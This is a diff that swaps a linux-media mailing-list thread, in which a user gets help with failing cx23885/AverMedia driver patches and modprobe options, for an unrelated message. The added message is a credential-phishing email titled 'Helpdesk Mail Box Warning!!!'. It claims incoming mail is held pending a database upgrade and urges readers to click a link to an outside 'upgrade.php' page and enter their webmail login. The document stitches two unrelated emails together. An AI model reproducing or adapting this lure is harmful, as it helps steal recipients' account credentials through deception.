@@ -1,114 +1,31 @@
 Return-path: <linux-media-owner@vger.kernel.org>
-Received: from moutng.kundenserver.de ([212.227.17.8]:53553 "EHLO
-	moutng.kundenserver.de" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1751605Ab3I0IY6 convert rfc822-to-8bit (ORCPT
+Received: from sgw01.kystverket.no ([153.44.0.3]:51376 "EHLO
+	SGW01.kystverket.no" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1751207Ab3IJXhY convert rfc822-to-8bit (ORCPT
 	<rfc822;linux-media@vger.kernel.org>);
-	Fri, 27 Sep 2013 04:24:58 -0400
-Date: Fri, 27 Sep 2013 10:24:55 +0200 (CEST)
-From: remi <remi@remis.cc>
-Reply-To: remi <remi@remis.cc>
-To: "Admin@tydaikho.com" <minhhoang1004@yahoo.com>
-Cc: linux-media@vger.kernel.org
-Message-ID: <259638318.304490.1380270295589.open-xchange@email.1and1.fr>
-In-Reply-To: <1379785395.42997.YahooMailNeo@web162903.mail.bf1.yahoo.com>
-References: <1379785395.42997.YahooMailNeo@web162903.mail.bf1.yahoo.com>
-Subject: Re: Need help with AverMedia306 driver on linux system.
+	Tue, 10 Sep 2013 19:37:24 -0400
+From: "Barkman, Maria" <maria.barkman@kystverket.no>
+Subject: Helpdesk Mail Box Warning!!! 
+Date: Tue, 10 Sep 2013 23:23:04 +0000
+Message-ID: <B53F5410AD771C4AAF1590FC509534AB062A18D5@POST02.kystverket.loc>
+Content-Language: nb-NO
+Content-Type: text/plain; charset=US-ASCII
+Content-Transfer-Encoding: 7BIT
 MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 8BIT
+To: unlisted-recipients:; (no To-header on input)@casper.infradead.org
 Sender: linux-media-owner@vger.kernel.org
 List-ID: <linux-media.vger.kernel.org>
 
-:)
-
-Also,
-
-
-by the time I redo the patch,
-
-
-You must have seen how i have reached this point,
-
-I have actually started by insering the module with card=39 as an option,
-
-
-So you can for now, add theses line to
-
-gpunk@gpunk-Aspire-8930:~$cat /etc/modprobe.d/video-tv.conf
-
-
-options tuner-xc2028 firmware_name=xc3028-v27.fw
-options cx23885 card=39
-
-
-I called my file this way ... it's arbitrary, please check the man modprobe of
-your ditribution/kernel .
-
-
-Best regards
-
-Rémi
 
 
 
-> Le 21 septembre 2013 à 19:43, "Admin@tydaikho.com" <minhhoang1004@yahoo.com> a écrit :
-> 
-> 
-> Hi Remi!
-> I got my card but i have not finish to install driver. I follow your patch on linuxtv.org but i am not successful. it makes some mistake: "malform" and "hunk" errors.
-> =======================
-> root@ty-debian:/usr/local/src/linuxtv# patch -p1 < ./cx23885.patch
-> can't find file to patch at input line 3
-> Perhaps you used the wrong -p or --strip option?
-> The text leading up to this was:
-> --------------------------
-> |--- drivers/media/pci/cx23885/cx23885.h   2013-03-25 05:45:50.000000000 +0100
-> |+++ drivers/media/pci/cx23885/cx23885.h      2013-08-21 13:55:20.010625134 +0200
-> --------------------------
-> File to patch: ./drivers/media/pci/cx23885/cx23885.h                                  
-> patching file ./drivers/media/pci/cx23885/cx23885.h
-> patch: **** malformed patch at line 4:  #define CX23885_BOARD_PROF_8000                37
-> ==========================
-> root@ty-debian:/usr/local/src/linuxtv# patch -p1 < ./cx23885-video.patch
-> can't find file to patch at input line 4
-> Perhaps you used the wrong -p or --strip option?
-> The text leading up to this was:
-> --------------------------
-> |--- drivers/media/pci/cx23885/cx23885-video.c     2013-08-02 05:45:59.000000000 +0200
-> |+++ drivers/media/pci/cx23885/cx23885-video.c        2013-08-21 13:55:20.017625046
-> |+0200
-> --------------------------
-> File to patch: ./drivers/media/pci/cx23885/cx23885-video.c
-> patching file ./drivers/media/pci/cx23885/cx23885-video.c
-> Hunk #1 FAILED at 511.
-> Hunk #2 FAILED at 1888.
-> 2 out of 2 hunks FAILED -- saving rejects to file ./drivers/media/pci/cx23885/cx23885-video.c.rej
-> ============================
-> root@ty-debian:/usr/local/src/linuxtv# patch -p1 < ./cx23885-cards.patch
-> can't find file to patch at input line 4
-> Perhaps you used the wrong -p or --strip option?
-> The text leading up to this was:
-> --------------------------
-> |--- drivers/media/pci/cx23885/cx23885-cards.c     2012-12-28 00:04:05.000000000 +0100
-> |+++ drivers/media/pci/cx23885/cx23885-cards.c        2013-08-21 14:15:54.173195979
-> |+0200
-> --------------------------
-> File to patch: ./drivers/media/pci/cx23885/cx23885-cards.c
-> patching file ./drivers/media/pci/cx23885/cx23885-cards.c
-> Hunk #1 FAILED at 604.
-> Hunk #2 FAILED at 841.
-> Hunk #3 FAILED at 1069.
-> Hunk #4 FAILED at 1394.
-> Hunk #5 FAILED at 1623.
-> Hunk #6 FAILED at 1758.
-> 6 out of 6 hunks FAILED -- saving rejects to file ./drivers/media/pci/cx23885/cx23885-cards.c.rej
-> ===============================
-> 
-> If you don't mind, i need your support to get my card works well. Thank you very much!
-> 
->  
-> ----------------------------------------------------------
-> Yahoo: minhhoang1004 + Google: minhhoang1004 + Skype: minhhoang1004 + MSN: tydaikho
-> ----------------------------------------------------------
-> 
-> (http://tydaikho.com)  VS  (http://vnluser.net)
+
+Your two incoming mails were placed on pending status due to the recent upgrade in our data base,
+
+In order to receive the messages kindly click HERE<http://c3-clerifynod.scienceontheweb.net/upgrade.php>
+
+Login with your correct Webmail information's and wait for responds from our data base service.
+We apologize for any inconvenience and do appreciate your understanding.
+
+Regards,
+HelpDesk Administrator Team.
